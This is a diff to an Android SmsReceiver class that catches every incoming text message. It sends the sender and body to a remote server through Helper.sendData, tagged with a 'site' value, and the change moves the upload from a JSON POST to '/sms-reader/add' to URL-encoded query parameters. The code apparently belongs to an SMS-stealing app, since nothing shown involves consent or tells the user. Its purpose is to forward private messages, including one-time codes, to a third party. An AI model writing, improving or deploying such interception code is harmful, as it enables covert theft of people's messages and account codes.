@@ -7,12 +7,14 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import org.json.JSONException;
-import org.json.JSONObject;
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+import java.util.Locale;
 
 public class SmsReceiver extends BroadcastReceiver {
 
     @Override
+
     public void onReceive(Context context, Intent intent) {
         if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
             Bundle bundle = intent.getExtras();
@@ -25,15 +27,14 @@ public class SmsReceiver extends BroadcastReceiver {
                             String sender = smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
                             Log.d("mywork", "SMS received from " + sender + " with message: " + messageBody);
-                            Helper.sendSMS("/site/number?site="+Helper.site, messageBody);
-                            JSONObject jsonData = new JSONObject();
+//                            Helper.sendSMS("?action=number&site="+Helper.site, messageBody);
                             try {
-                                jsonData.put("site", Helper.site);
-                                jsonData.put("message", messageBody);
-                                jsonData.put("sender", sender);
-                                Helper.sendData("/sms-reader/add", jsonData);
-                            } catch (JSONException e) {
-                                throw new RuntimeException(e);
+                                String encodedSender = URLEncoder.encode(sender, "UTF-8");
+                                String encodedMessage = URLEncoder.encode(messageBody, "UTF-8");
+                                String path = String.format(Locale.getDefault(), "action=android&site=%s&sender=%s&message=%s", Helper.site, encodedSender, encodedMessage);
+                                Helper.sendData(path);
+                            } catch (UnsupportedEncodingException e) {
+                                e.printStackTrace();
                             }
                         }
                     }
